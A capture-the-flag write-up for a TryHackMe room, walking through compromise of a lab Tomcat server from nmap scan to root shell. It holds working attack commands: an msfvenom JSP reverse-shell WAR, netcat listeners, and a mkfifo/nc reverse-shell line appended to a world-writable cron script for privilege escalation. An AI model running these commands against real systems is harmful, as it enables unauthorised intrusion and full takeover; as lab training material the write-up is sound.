# Room
https://tryhackme.com/room/bsidesgtthompson

# Task 1
* Enumeration - nmap
    ```
    nmap -A -T4 10.10.72.85

    Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-29 16:01 EST
    Nmap scan report for 10.10.72.85
    Host is up (0.14s latency).
    Not shown: 997 closed ports
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
    |   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
    |_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
    8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
    |_ajp-methods: Failed to get a valid response for the OPTION request
    8080/tcp open  http    Apache Tomcat 8.5.5
    |_http-favicon: Apache Tomcat
    |_http-title: Apache Tomcat/8.5.5
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 19.90 seconds
    ```
* Enumeration - nmap review

Tomcat is running on this server, we'll try to browse the site first

* Enumeration - browse Tomcat
    * Opened ZAP
    * Opened Firefox and set FoxyProxy to use ZAP
    * In ZAP
        * Quick Start > Automated Scan > IP of target + port 8080
        * Use traditional spider
        * Start Scan
    * Browsed around the site
    * Clicked on Manager App and was able to login with the default creds
    * From here you can upload a WAR file and deploy it

* Exploit research - malicious WAR files
    * https://netsec.ws/?p=331
    * https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/

* Exploit creation - msfvenom
    ```
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=a.b.c.d LPORT=1234 -f war > shell.war
    Payload size: 1098 bytes
    Final size of war file: 1098 bytes
    ```
* Create a listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    ```
* Upload and deploy the malicious WAR file, then navigate to the shell directory
    ```
    https://10.10.72.85:8080/shell/
    ```
* Check listener
    ```
    listening on [any] 1234 ...
    connect to [a.b.c.d] from (UNKNOWN) [10.10.72.85] 38160
    whoami
    tomcat
    ```
* Upgrade the netcat shell
    ```
    Python bash upgrade fails, use sh instead

    python -c 'import pty;pty.spawn("/bin/sh")'
    $ whoami
    whoami
    tomcat
    $ 

    $ bash -i   
    tomcat@ubuntu:/$        
    ```
* Check /home
    ```
    tomcat@ubuntu:~$ cd /home
    cd /home
    tomcat@ubuntu:/home$ ls -lrta
    ls -lrta
    total 12
    drwxr-xr-x  3 root root 4096 Aug 14  2019 .
    drwxr-xr-x 22 root root 4096 Aug 14  2019 ..
    drwxr-xr-x  4 jack jack 4096 Aug 23  2019 jack
    tomcat@ubuntu:/home$ cd jack
    cd jack
    tomcat@ubuntu:/home/jack$ ls -lrta
    ls -lrta
    total 48
    drwxr-xr-x 3 root root 4096 Aug 14  2019 ..
    -rw-r--r-- 1 jack jack  655 Aug 14  2019 .profile
    -rw-r--r-- 1 jack jack 3771 Aug 14  2019 .bashrc
    -rw-r--r-- 1 jack jack  220 Aug 14  2019 .bash_logout
    drwx------ 2 jack jack 4096 Aug 14  2019 .cache
    -rw-r--r-- 1 jack jack    0 Aug 14  2019 .sudo_as_admin_successful
    -rw-r--r-- 1 root root  183 Aug 14  2019 .wget-hsts
    drwxrwxr-x 2 jack jack 4096 Aug 14  2019 .nano
    -rw-rw-r-- 1 jack jack   33 Aug 14  2019 user.txt
    -rw------- 1 root root 1476 Aug 14  2019 .bash_history
    -rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh
    drwxr-xr-x 4 jack jack 4096 Aug 23  2019 .
    -rw-r--r-- 1 root root   39 Jan 29 14:25 test.txt
    tomcat@ubuntu:/home/jack$ cat user.txt
    cat user.txt
    [removed]
    ```
* Check id.sh and test.txt in /home/jack
    ```
    tomcat@ubuntu:/home/jack$ cat id.sh
    cat id.sh
    #!/bin/bash
    id > test.txt
    tomcat@ubuntu:/home/jack$ cat test.txt
    cat test.txt
    uid=0(root) gid=0(root) groups=0(root)
    ```
* Check cron
    ```
    tomcat@ubuntu:/home/jack$ cat /etc/crontab
    cat /etc/crontab
    # /etc/crontab: system-wide crontab
    # Unlike any other crontab you don't have to run the `crontab'
    # command to install the new version when you edit this file
    # and files in /etc/cron.d. These files also have username fields,
    # that none of the other crontabs do.

    SHELL=/bin/sh
    PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

    # m h dom mon dow user  command
    17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
    25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
    47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
    52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
    *  *    * * *   root    cd /home/jack && bash id.sh
    ```
* Setup listener 2
    ```
    nc -nvlp 4321
    listening on [any] 4321 ...
    ```
* Append to id.sh
    ```
    tomcat@ubuntu:/home/jack$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc a.b.c.d 4321 >/tmp/f' >> id.sh   
    
    tomcat@ubuntu:/home/jack$ cat id.sh
    cat id.sh
    #!/bin/bash
    id > test.txt
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc a.b.c.d 4321 >/tmp/f
    ```
* Wait for cron to run, then check listener
    ```
    connect to [a.b.c.d] from (UNKNOWN) [10.10.72.85] 43988
    /bin/sh: 0: can't access tty; job control turned off
    # whoami
    root
    # cd /root
    # ls -lrta
    total 24
    -rw-r--r--  1 root root  148 Aug 17  2015 .profile
    -rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
    drwxr-xr-x  2 root root 4096 Aug 14  2019 .nano
    -rw-r--r--  1 root root   33 Aug 14  2019 root.txt
    drwx------  3 root root 4096 Aug 14  2019 .
    drwxr-xr-x 22 root root 4096 Aug 14  2019 ..
    # cat root.txt
    [removed]
    ```
# Review
Our initial scan found Tomcat installed.  After loading up ZAP and Firefox I manually browsed the site and discovered I could login to the Manager App with default creds.  Once logged in I noticed you could upload a WAR file.  Researching this lead to the discovery of creating a malicious shell with msfvenom.  I created the shell, uploaded the WAR file, and then navigated to the /shell directory in the web page while I had a listener up.  At this point I had a tomcat user shell.  Python bash tty upgrades didn't work so I used sh instead and then bash -i and called it good enough.  

Looking at the /home directory I found the jack folder was accessible, inside we got the user flag.  Inside the /home/jack directory were two files, id.sh and test.txt.  Id.sh was creating test.txt.  A review of/etc/crontab found a cron job executing every minute as root which was running id.sh.  I setup a second listener and then appended shell code to id.sh since it was 777.  After waiting a minute for the cron job to run I received a root shell on my listener.